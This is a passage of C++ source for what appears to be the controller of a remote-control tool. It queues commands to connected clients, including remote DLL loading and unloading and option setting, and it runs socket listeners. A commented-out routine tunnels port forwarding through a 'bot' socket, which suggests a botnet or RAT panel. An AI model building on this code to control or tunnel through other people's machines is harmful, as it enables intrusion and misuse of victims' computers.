		lstrcpy(opts.m_ProccessName,ProccessName);
		lstrcpy(opts.m_WinHederName,WinHederName);
		lstrcpy(opts.m_ClassName,ClassName);
		AutoUpdate=iAutoUpdate;

		I->Reset();
		I->m_Sent.Create( PK_SC_SETOPTIONS, timeGetTime(), sizeof(opts), &opts );
	}
	else
	{
		I->Reset();
		I->m_Sent.Create( PK_SC_SETOPTIONS, timeGetTime(), 0, NULL );
	}
	m_TransactionLock.Unlock();
}
void CClient::RequestCLOSE_SB_NOW()
{
	m_TransactionLock.Lock();
	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_CLOLSE_SB );
	I->Reset();
	I->m_Sent.Create( PK_SC_CLOLSE_SB, timeGetTime(), 0, NULL );
	m_TransactionLock.Unlock();
}
void CClient::RequestLoadDLL()
{
	m_TransactionLock.Lock();
	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_LOAD_DLL );
	I->Reset();
	I->m_Sent.Create( PK_SC_LOAD_DLL, timeGetTime(), 0, NULL );
	m_TransactionLock.Unlock();
}

void CClient::RequestCloseDLL()
{
	m_TransactionLock.Lock();
	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_CLOSE_DLL );
	I->Reset();
	I->m_Sent.Create( PK_SC_CLOSE_DLL, timeGetTime(), 0, NULL );
	m_TransactionLock.Unlock();
}
/*nt CClient::RequestPortForw(int port )
{
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_PORTFORW );
	PORT_FORW  pf;
	SOCKET bot, client;
	int portBot, portClient;

	portBot = CreatePort(bot);
	if( portBot == 0 ) return 0;
	portClient = CreatePort(client);
	if( portClient == 0 )
	{
		closesocket(bot);
		return 0;
	}

	pf.portForw = port;
	pf.portConnect = portBot;

	I->Reset();
	I->m_Sent.Create( PK_SC_PORTFORW, timeGetTime(), sizeof(PORT_FORW), &pf );

	TUNNEL_INFO* tunnelInfo = (TUNNEL_INFO*) malloc(sizeof(TUNNEL_INFO));
	tunnelInfo->bot = bot;
	tunnelInfo->client = client;
	CloseHandle(CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)StartPortForw,(LPVOID)tunnelInfo,0,NULL));

	m_TransactionLock.Unlock();
	return portClient;
}*/

bool CClient::GetSetOptionsResult( )
{
	// TODO:
	return false;
}

//=================================================

CListener::CListener( int port, HWND notifyWindow )
	: m_Port( port )
	, m_hThread( 0 )
	, m_dwThreadID( 0 )
	, m_hClThread( 0 )
	, m_dwClThreadID( 0 )
	, m_hStopEvent( CreateEvent(0,TRUE,FALSE,0) )
	, m_hChangeEvent( CreateEvent(0,TRUE,FALSE,0) )
	, m_bEnumStarted( false )
	, m_hNotify( notifyWindow )
{
	m_hThread = CreateThread( 0, 0, ListenerThread, this, 0, &m_dwThreadID );
	m_hClThread = CreateThread( 0, 0, ClientsThread, this, 0, &m_dwClThreadID );
}


CListener::~CListener()
{
	SetEvent( m_hStopEvent );
	WaitForSingleObject( m_hThread, INFINITE );
	WaitForSingleObject( m_hClThread, INFINITE );

	CClient::CClientList::iterator I = m_Clients.begin();
	for( ; I != m_Clients.end(); I++ )
	{
		delete (*I);
	}

	CloseHandle( m_hThread );
	CloseHandle( m_hClThread );
	CloseHandle( m_hStopEvent );
	CloseHandle( m_hChangeEvent );
}

CListener::Errors CListener::GetError()
{
	if( m_hThread == 0 ||
		m_hClThread == 0 )
	{
		return CANT_START_THREAD;
	}

	DWORD dwCode = 0;

	GetExitCodeThread( m_hThread, &dwCode );
	if( dwCode != STILL_ACTIVE )
	{
		return (Errors)dwCode;
	}

	GetExitCodeThread( m_hClThread, &dwCode );
	if( dwCode != STILL_ACTIVE )
	{
		return (Errors)dwCode;
	}

	return OK;
}

bool CListener::CheckChanges()
{
	if( WaitForSingleObject( m_hChangeEvent, 0 ) == WAIT_OBJECT_0 )
	{
		ResetEvent( m_hChangeEvent );
		return true;
	}
	return false;
}

CClient *CListener::ClientEnum_First()
{
	if( !m_bEnumStarted )
	{
		m_Lock.Lock();
		if( !m_Clients.empty() )
		{
			m_CurrentClient = m_Clients.begin();
			m_bEnumStarted = true;
			return (*m_CurrentClient);
		}
		else
		{
			m_Lock.Unlock();
		}
	}
	return 0;
}

CClient *CListener::ClientEnum_Next()
{
	if( m_bEnumStarted )
	{
		m_CurrentClient++;
		if( m_CurrentClient != m_Clients.end() )
		{
			return (*m_CurrentClient);
		}
	}
	return 0;
}

void CListener::ClientEnum_End()
{
	if( m_bEnumStarted )
	{
		m_bEnumStarted = false;
		m_Lock.Unlock();
	}
}


CListener::Errors CListener::EnumLocalInterfaces( vector<CLSocket>& s )
{
	HOSTENT *he = gethostbyname(0);
	for( size_t i=0; he->h_addr_list[i]; i++ )
	{
		CLSocket cl;
		ZeroMemory( &cl, sizeof(cl) );

		CopyMemory( & cl.addr.sin_addr.S_un.S_addr, he->h_addr_list[i], 4 );
		cl.addr.sin_family = AF_INET;
		//cl.addr.sin_port = htons(DEFAULT_SERVER_PORT);
		cl.addr.sin_port = htons(m_Port);
		s.push_back( cl );
	}

	CLSocket cl;
	ZeroMemory( &cl, sizeof(cl) );
	cl.addr.sin_addr.S_un.S_un_b.s_b1 = 127;
	cl.addr.sin_addr.S_un.S_un_b.s_b2 = 0;
	cl.addr.sin_addr.S_un.S_un_b.s_b3 = 0;
	cl.addr.sin_addr.S_un.S_un_b.s_b4 = 1;
	cl.addr.sin_family = AF_INET;
	//cl.addr.sin_port = htons(DEFAULT_SERVER_PORT);
	cl.addr.sin_port = htons(m_Port);
	s.push_back( cl );

	return OK;
}

CListener::Errors CListener::CreateListeners( vector<CLSocket>& s )
{
	for( size_t i=0; i<s.size(); i++ )
	{
		s[i].sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );

		if( s[i].sock == INVALID_SOCKET )
		{
			return CANT_CREATE_SOCKET;
		}

		if( bind( s[i].sock, (sockaddr*)(& s[i].addr), sizeof(s[i].addr) ) != 0 )
		{
			return CANT_BIND_SOCKET;
		}

		if( listen( s[i].sock, 10 ) != 0 )
		{
			return CANT_LISTEN_SOCKET;
		}
	}

	return OK;
}

void CListener::PollListeners( vector<CLSocket>& s )
{
	for( size_t i=0; i<s.size(); i++ )
	{
		timeval to;
		to.tv_sec = 0;
		to.tv_usec = 0;

		fd_set fds;
		fds.fd_count = 1;
		fds.fd_array[0] = s[i].sock;

		if( select(1,&fds,0,0,&to) == 1 )
		{
			sockaddr_in from;
			int from_len = sizeof(from);
			ZeroMemory( &from, sizeof(from) );
			SOCKET s1 = accept( s[i].sock, (sockaddr*)&from, &from_len );
			if( s1 != INVALID_SOCKET )
			{
				m_Lock.Lock();
				m_Clients.push_back( new CClient( s1, &from ) );
				SendMessage( m_hNotify, PM_CLIENT_ADDED, 0, (LPARAM)m_Clients.back() );
				SetEvent( m_hChangeEvent );
				m_Lock.Unlock();
			}
		}
	}
}

void CListener::CloseListeners( vector<CLSocket>& s )
{
	for( size_t i=0; i<s.size(); i++ )
	{
		shutdown( s[i].sock, SD_BOTH );
		closesocket( s[i].sock );
	}
}

DWORD WINAPI CListener::ListenerThread( LPVOID lpThreadParameter )
{
	Errors err = OK;
	CListener *p = (CListener *)lpThreadParameter;

	vector<CLSocket> s;
	if( (err=p->EnumLocalInterfaces(s)) == OK )
	{
		if( (err=p->CreateListeners(s)) == OK )
		{
			while( WaitForSingleObject( p->m_hStopEvent, 0 ) != WAIT_OBJECT_0 )
			{
				p->PollListeners(s);
				Sleep(23);
			}
			p->CloseListeners(s);
		}
	}

	return err;
}


CClient *CListener::VerifyAndLockClient( DWORD_PTR id )
{
	m_Lock.Lock();

	CClient *pRet = 0;
	CClient *pTest = (CClient *)id;
	CClient::CClientList::iterator I = m_Clients.begin();
	for( ; I != m_Clients.end(); I++ )
	{
		if( (*I) == pTest )
		{
			if( !pTest->IsLocked() )
			{
				pTest->Lock();
				pRet = pTest;
				break;
			}
		}
	}

	m_Lock.Unlock();
	return pRet;
}

void CListener::UnlockClient( CClient *p )
{
	m_Lock.Lock();
	p->Unlock();
	m_Lock.Unlock();
}


void CListener::PollClients( )
{
	m_Lock.Lock();

	CClient::CClientList::iterator I = m_Clients.begin();
	while( I != m_Clients.end() )
	{
		if( !(*I)->Poll( m_hNotify ) )
		{
			if( !(*I)->IsLocked() )
			{
				delete (*I);
				SendMessage( m_hNotify, PM_CLIENT_REMOVED, 0, (LPARAM)(*I) );
				m_Clients.erase( I++ );
				SetEvent( m_hChangeEvent );
			}
			else
			{
				I++;
			}
		}
		else
		{
			I++;
		}
	}

	m_Lock.Unlock();
}

DWORD WINAPI CListener::ClientsThread( LPVOID lpThreadParameter )
{
	Errors err = OK;
	CListener *p = (CListener *)lpThreadParameter;

	while( WaitForSingleObject( p->m_hStopEvent, 0 ) != WAIT_OBJECT_0 )
	{
		p->PollClients( );
		Sleep(7);
	}

	return err;
}
